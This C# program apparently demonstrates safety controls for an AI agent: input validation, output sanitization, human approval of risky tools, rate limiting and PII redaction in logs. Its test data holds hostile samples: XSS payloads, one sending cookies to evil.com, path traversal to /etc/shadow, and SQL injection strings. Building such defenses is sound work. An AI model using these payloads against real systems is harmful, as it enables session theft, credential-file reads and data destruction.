using System.ClientModel;
using AgentSafetySample.Safety;
using AgentSafetySample.Tools;
using Azure.AI.OpenAI;
using Azure.Identity;
using Microsoft.Agents.AI;
using Microsoft.Extensions.AI;
using Microsoft.Extensions.Configuration;
using OpenAI.Responses;

namespace AgentSafetySample;

class Program
{
    static async Task Main(string[] args)
    {
        var configuration = new ConfigurationBuilder()
            .SetBasePath(Directory.GetCurrentDirectory())
            .AddJsonFile("appsettings.json", optional: true)
            .AddJsonFile("appsettings.Development.json", optional: true)
            .Build();

        var azureEndpoint = configuration["AzureOpenAI:Endpoint"];
        var azureApiKey = configuration["AzureOpenAI:ApiKey"];
        var deploymentName = configuration["AzureOpenAI:DeploymentName"] ?? "gpt-4o-mini";

        // Load safety configuration
        var maxInputLength = configuration.GetValue<int>("Safety:MaxInputLength", 4000);
        var maxOutputTokens = configuration.GetValue<int>("Safety:MaxOutputTokens", 2048);
        var rateLimitPerMinute = configuration.GetValue<int>("Safety:RateLimitPerMinute", 10);
        var allowedDirs = configuration.GetSection("Safety:AllowedFileDirectories").Get<string[]>() ?? ["./data"];
        var blockedPatterns = configuration.GetSection("Safety:BlockedPatterns").Get<string[]>() ?? [];
        var approvalTools = configuration.GetSection("Safety:RequireApprovalForTools").Get<string[]>() ?? [];
        var sanitizeHtml = configuration.GetValue<bool>("Safety:SanitizeHtmlOutput", true);

        if (string.IsNullOrEmpty(azureEndpoint))
        {
            Console.WriteLine("Error: Set AzureOpenAI:Endpoint in appsettings.Development.json");
            return;
        }

        // ── Initialize safety components ──
        var inputValidator = new InputValidator(maxInputLength, blockedPatterns, allowedDirs);
        var outputSanitizer = new OutputSanitizer(sanitizeHtml);
        var resourceLimiter = new ResourceLimiter(rateLimitPerMinute, maxOutputTokens, maxInputLength);
        var logRedactor = new LogRedactor();

        AzureOpenAIClient openAIClient = string.IsNullOrEmpty(azureApiKey)
            ? new AzureOpenAIClient(new Uri(azureEndpoint), new DefaultAzureCredential())
            : new AzureOpenAIClient(new Uri(azureEndpoint), new ApiKeyCredential(azureApiKey));

        Console.WriteLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        Console.WriteLine("  Microsoft Agent Framework — Safety Demo");
        Console.WriteLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        Console.WriteLine($"Model: {deploymentName}");
        Console.WriteLine($"Max input: {maxInputLength} chars | Max output: {maxOutputTokens} tokens");
        Console.WriteLine($"Rate limit: {rateLimitPerMinute}/min | HTML sanitize: {sanitizeHtml}");
        Console.WriteLine($"Tools requiring approval: {string.Join(", ", approvalTools)}");
        Console.WriteLine();

        // ── Demo 1: Input Validation ──
        await Demo1_InputValidation(inputValidator);

        // ── Demo 2: Output Sanitization ──
        Demo2_OutputSanitization(outputSanitizer);

        // ── Demo 3: Tool Approval (HITL) ──
        await Demo3_ToolApproval(openAIClient, deploymentName, approvalTools);

        // ── Demo 4: Resource Limits & Rate Limiting ──
        Demo4_ResourceLimits(resourceLimiter);

        // ── Demo 5: Secure Logging ──
        Demo5_SecureLogging(logRedactor);

        // ── Demo 6: Full Pipeline with Agent ──
        await Demo6_FullSafetyPipeline(openAIClient, deploymentName, inputValidator, outputSanitizer, resourceLimiter, logRedactor);

        Console.WriteLine("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        Console.WriteLine("  All demos complete!");
        Console.WriteLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    }

    // ═══════════════════════════════════════════════════════
    // Demo 1: Input Validation
    // ═══════════════════════════════════════════════════════
    static Task Demo1_InputValidation(InputValidator validator)
    {
        Console.WriteLine("━━━ Demo 1: Input Validation ━━━\n");

        var testInputs = new[]
        {
            ("Normal request", "What is the weather in Seattle?"),
            ("XSS attempt", "Hello <script>alert('xss')</script> world"),
            ("Event handler injection", "Check this <img onerror=alert(1) src=x>"),
            ("Oversized input", new string('A', 5000)),
            ("Path traversal in text", "Read the file at ../../etc/passwd"),
        };

        foreach (var (label, input) in testInputs)
        {
            var violations = validator.Validate(input);
            var status = violations.Count == 0 ? "✅ PASS" : "🛑 BLOCKED";
            Console.WriteLine($"  {status} [{label}]");
            foreach (var v in violations)
            {
                Console.WriteLine($"         → {v}");
            }
        }

        // Path traversal validation
        Console.WriteLine("\n  Path traversal checks:");
        var paths = new[] { "./data/report.csv", "../../etc/passwd", "./data/../../../secret.txt" };
        foreach (var path in paths)
        {
            var (isValid, resolved, error) = validator.ValidateFilePath(path);
            Console.WriteLine($"    {(isValid ? "✅" : "🛑")} {path}{(isValid ? $" → {resolved}" : $" → {error}")}");
        }

        // Function argument validation
        Console.WriteLine("\n  Function argument checks:");
        var args1 = new Dictionary<string, object?> { ["customerId"] = 1001 };
        var v1 = validator.ValidateFunctionArgs("LookupCustomer", args1);
        Console.WriteLine($"    ✅ LookupCustomer(1001): {(v1.Count == 0 ? "valid" : string.Join(", ", v1))}");

        var args2 = new Dictionary<string, object?> { ["filePath"] = "../../etc/shadow" };
        var v2 = validator.ValidateFunctionArgs("ReadFile", args2);
        Console.WriteLine($"    🛑 ReadFile(../../etc/shadow): {string.Join(", ", v2)}");

        Console.WriteLine();
        return Task.CompletedTask;
    }

    // ═══════════════════════════════════════════════════════
    // Demo 2: Output Sanitization
    // ═══════════════════════════════════════════════════════
    static void Demo2_OutputSanitization(OutputSanitizer sanitizer)
    {
        Console.WriteLine("━━━ Demo 2: Output Sanitization ━━━\n");

        var testOutputs = new[]
        {
            ("Clean text", "The weather in Seattle is 18°C and partly cloudy."),
            ("XSS in output", "Here is the result: <script>document.location='http://evil.com?c='+document.cookie</script>Done."),
            ("Event handler", "Click <a href='#' onclick='stealData()'>here</a> for more info."),
            ("Safe HTML", "The answer is <b>42</b> and it's <em>important</em>."),
            ("JS protocol", "Visit <a href='javascript:alert(1)'>this link</a> for details."),
        };

        foreach (var (label, output) in testOutputs)
        {
            var (sanitized, warnings) = sanitizer.Sanitize(output);
            var status = warnings.Count == 0 ? "✅" : "⚠️";
            Console.WriteLine($"  {status} [{label}]");
            if (warnings.Count > 0)
            {
                foreach (var w in warnings) Console.WriteLine($"       Warning: {w}");
                Console.WriteLine($"       Before: {Truncate(output, 80)}");
                Console.WriteLine($"       After:  {Truncate(sanitized, 80)}");
            }
            else
            {
                Console.WriteLine($"       Output: {Truncate(sanitized, 80)}");
            }
        }

        // SQL injection check
        Console.WriteLine("\n  SQL injection scan:");
        var sqlTests = new[]
        {
            "The customer name is Alice.",
            "Try this query: '; DROP TABLE Users;--",
            "Search for: ' OR '1'='1",
        };
        foreach (var test in sqlTests)
        {
            var (isSafe, threats) = sanitizer.CheckForSqlInjection(test);
            Console.WriteLine($"    {(isSafe ? "✅ Safe" : "🛑 THREAT")}: {Truncate(test, 60)}");
            foreach (var t in threats) Console.WriteLine($"         → {t}");
        }

        Console.WriteLine();
    }

    // ═══════════════════════════════════════════════════════
    // Demo 3: Tool Approval (Human-in-the-Loop)
    // ═══════════════════════════════════════════════════════
    static async Task Demo3_ToolApproval(AzureOpenAIClient openAIClient, string deploymentName, string[] approvalToolNames)
    {
        Console.WriteLine("━━━ Demo 3: Tool Approval (HITL) ━━━\n");

        // Create function tools
        AIFunction lookupFn = AIFunctionFactory.Create(SampleTools.LookupCustomer);
        AIFunction weatherFn = AIFunctionFactory.Create(SampleTools.GetWeather);
        AIFunction deleteFn = AIFunctionFactory.Create(SampleTools.DeleteRecord);
        AIFunction sendEmailFn = AIFunctionFactory.Create(SampleTools.SendEmail);
        AIFunction execFn = AIFunctionFactory.Create(SampleTools.ExecuteCommand);

        // Wrap high-risk tools with ApprovalRequiredAIFunction
        var tools = new List<AIFunction>();
        var allFunctions = new[] { lookupFn, weatherFn, deleteFn, sendEmailFn, execFn };

        foreach (var fn in allFunctions)
        {
            if (approvalToolNames.Contains(fn.Name, StringComparer.OrdinalIgnoreCase))
            {
                tools.Add(new ApprovalRequiredAIFunction(fn));
                Console.WriteLine($"  🔒 {fn.Name} — requires approval");
            }
            else
            {
                tools.Add(fn);
                Console.WriteLine($"  ✅ {fn.Name} — auto-approved");
            }
        }

        // Create agent with tools
        AIAgent agent = openAIClient
            .GetResponsesClient(deploymentName)
            .AsAIAgent(new ChatClientAgentOptions
            {
                Name = "SafetyAgent",
                ChatOptions = new()
                {
                    Instructions = "You are a customer service assistant. Use your tools when needed.",
                    Tools = tools.Cast<AITool>().ToList(),
                },
            });

        // Test 1: Safe tool (auto-approved)
        Console.WriteLine("\n  Test: Safe tool call (auto-approved)");
        Console.WriteLine("  User: What's the weather in Amsterdam?");

        AgentSession session1 = await agent.CreateSessionAsync();
        AgentResponse response1 = await agent.RunAsync("What's the weather in Amsterdam?", session1);
        Console.WriteLine($"  Agent: {Truncate(response1.Text, 100)}");

        // Test 2: High-risk tool (requires approval)
        Console.WriteLine("\n  Test: High-risk tool call (requires approval)");
        Console.WriteLine("  User: Delete customer 1001");

        AgentSession session2 = await agent.CreateSessionAsync();
        AgentResponse response2 = await agent.RunAsync("Delete customer record 1001 please.", session2);

        // Check for approval requests
        var approvalRequests = response2.Messages
            .SelectMany(m => m.Contents)
            .OfType<FunctionApprovalRequestContent>()
            .ToList();

        if (approvalRequests.Count > 0)
        {
            foreach (var request in approvalRequests)
            {
                Console.WriteLine($"  ⚠️  APPROVAL REQUIRED: {request.FunctionCall.Name}({FormatArgs(request.FunctionCall.Arguments)})");
            }

            // Simulate rejection
            Console.WriteLine("  → Simulating REJECTION...");
            var rejectionMessage = new ChatMessage(ChatRole.User,
                approvalRequests.Select(r => (AIContent)r.CreateResponse(false)).ToList());
            AgentResponse rejectedResponse = await agent.RunAsync(rejectionMessage, session2);
            Console.WriteLine($"  Agent: {Truncate(rejectedResponse.Text, 100)}");
        }
        else
        {
            Console.WriteLine($"  Agent: {Truncate(response2.Text, 100)}");
            Console.WriteLine("  (Note: Tool may not have been called if the LLM answered directly)");
        }

        Console.WriteLine();
    }

    // ═══════════════════════════════════════════════════════
    // Demo 4: Resource Limits & Rate Limiting
    // ═══════════════════════════════════════════════════════
    static void Demo4_ResourceLimits(ResourceLimiter limiter)
    {
        Console.WriteLine("━━━ Demo 4: Resource Limits & Rate Limiting ━━━\n");

        string sessionId = "user-session-001";

        // Input length check
        Console.WriteLine("  Input length validation:");
        var (okShort, _) = limiter.CheckInputLength("Hello, how are you?");
        Console.WriteLine($"    ✅ Short input (19 chars): allowed={okShort}");

        var longInput = new string('X', 5000);
        var (okLong, longError) = limiter.CheckInputLength(longInput);
        Console.WriteLine($"    🛑 Long input (5000 chars): allowed={okLong} — {longError}");

        // Rate limiting
        Console.WriteLine("\n  Rate limiting (simulating rapid requests):");
        for (int i = 1; i <= 12; i++)
        {
            var (allowed, error, remaining) = limiter.CheckRateLimit(sessionId);
            if (allowed)
            {
                Console.WriteLine($"    ✅ Request {i}: allowed (remaining: {remaining})");
            }
            else
            {
                Console.WriteLine($"    🛑 Request {i}: {error}");
            }
        }

        var (count, max) = limiter.GetUsageStats(sessionId);
        Console.WriteLine($"\n  Session stats: {count}/{max} requests used in current window");

        Console.WriteLine($"  MaxOutputTokens configured: {limiter.MaxOutputTokens}");
        Console.WriteLine();
    }

    // ═══════════════════════════════════════════════════════
    // Demo 5: Secure Logging (PII Redaction)
    // ═══════════════════════════════════════════════════════
    static void Demo5_SecureLogging(LogRedactor redactor)
    {
        Console.WriteLine("━━━ Demo 5: Secure Logging (PII Redaction) ━━━\n");

        var testMessages = new[]
        {
            "User alice@company.com asked about order #12345.",
            "Customer SSN is 123-45-6789 and their card is 4111 1111 1111 1111.",
            "Call them at 555-867-5309 for verification.",
            "API key: FJXomgHQuMmxSw3YNh69QH60zIy820dvpn5MxX42VP66TPybr1YZJQQJ",
            "The weather in Seattle is nice today.",
        };

        foreach (var msg in testMessages)
        {
            var (hasSensitive, categories) = redactor.Scan(msg);
            var redacted = redactor.Redact(msg);

            if (hasSensitive)
            {
                Console.WriteLine($"  ⚠️  Contains: {string.Join(", ", categories)}");
                Console.WriteLine($"       Original:  {Truncate(msg, 70)}");
                Console.WriteLine($"       Redacted:  {Truncate(redacted, 70)}");
            }
            else
            {
                Console.WriteLine($"  ✅ Clean: {Truncate(msg, 70)}");
            }
        }

        Console.WriteLine();
    }

    // ═══════════════════════════════════════════════════════
    // Demo 6: Full Safety Pipeline with Agent
    // ═══════════════════════════════════════════════════════
    static async Task Demo6_FullSafetyPipeline(
        AzureOpenAIClient openAIClient,
        string deploymentName,
        InputValidator inputValidator,
        OutputSanitizer outputSanitizer,
        ResourceLimiter resourceLimiter,
        LogRedactor logRedactor)
    {
        Console.WriteLine("━━━ Demo 6: Full Safety Pipeline ━━━\n");

        // Create a basic agent
        AIAgent baseAgent = openAIClient
            .GetResponsesClient(deploymentName)
            .AsAIAgent(new ChatClientAgentOptions
            {
                Name = "SafeAgent",
                ChatOptions = new()
                {
                    Instructions = "You are a helpful assistant. Answer concisely.",
                    MaxOutputTokens = resourceLimiter.MaxOutputTokens,
                },
            });

        // Wrap with AIAgentBuilder middleware pipeline
        AIAgent safeAgent = baseAgent.AsBuilder()
            .Use(async (messages, session, options, next, cancellationToken) =>
            {
                // ── PRE-PROCESSING: Validate input ──
                var userMessages = messages
                    .Where(m => m.Role == ChatRole.User)
                    .SelectMany(m => m.Contents)
                    .OfType<TextContent>()
                    .Select(t => t.Text);

                foreach (var text in userMessages)
                {
                    // Rate limit check
                    var sessionId = session?.GetHashCode().ToString() ?? "default";
                    var (rateLimitOk, rateLimitError, _) = resourceLimiter.CheckRateLimit(sessionId);
                    if (!rateLimitOk)
                    {
                        Console.WriteLine($"    🛑 Rate limit: {rateLimitError}");
                        return; // Block the request
                    }

                    // Input validation
                    var violations = inputValidator.Validate(text);
                    if (violations.Count > 0)
                    {
                        Console.WriteLine($"    🛑 Input blocked: {string.Join("; ", violations)}");
                        return;
                    }

                    // Log redacted input
                    var redactedInput = logRedactor.Redact(text);
                    Console.WriteLine($"    📝 Log: {Truncate(redactedInput, 60)}");
                }

                // ── INVOKE INNER AGENT ──
                await next(messages, session, options, cancellationToken);
            })
            .Build();

        // Test inputs through the full pipeline
        var pipelineTests = new[]
        {
            ("Normal question", "What is 2 + 2?"),
            ("Question with email", "My email is bob@example.com, what's the weather?"),
            ("XSS attempt", "Tell me <script>alert('hacked')</script> a joke"),
            ("Normal follow-up", "Explain quantum computing in one sentence."),
        };

        AgentSession session = await safeAgent.CreateSessionAsync();
        foreach (var (label, input) in pipelineTests)
        {
            Console.WriteLine($"\n  [{label}]");
            Console.WriteLine($"  User: {input}");

            try
            {
                AgentResponse response = await safeAgent.RunAsync(input, session);

                if (response.Text is not null)
                {
                    // Post-process: sanitize output
                    var (sanitized, warnings) = outputSanitizer.Sanitize(response.Text);
                    foreach (var w in warnings)
                    {
                        Console.WriteLine($"    ⚠️  Output sanitized: {w}");
                    }

                    // Log redacted output
                    var redactedOutput = logRedactor.Redact(sanitized);
                    Console.WriteLine($"  Agent: {Truncate(sanitized, 100)}");
                }
                else
                {
                    Console.WriteLine("  Agent: (no text response)");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"  Error: {ex.Message}");
            }
        }

        Console.WriteLine();
    }

    // ═══════════════════════════════════════════════════════
    static string Truncate(string text, int maxLength)
    {
        text = text.ReplaceLineEndings(" ");
        return text.Length <= maxLength ? text : text[..maxLength] + "...";
    }

    static string FormatArgs(IDictionary<string, object?>? args)
    {
        if (args is null || args.Count == 0) return "";
        return string.Join(", ", args.Select(kv => $"{kv.Key}: {kv.Value}"));
    }
}
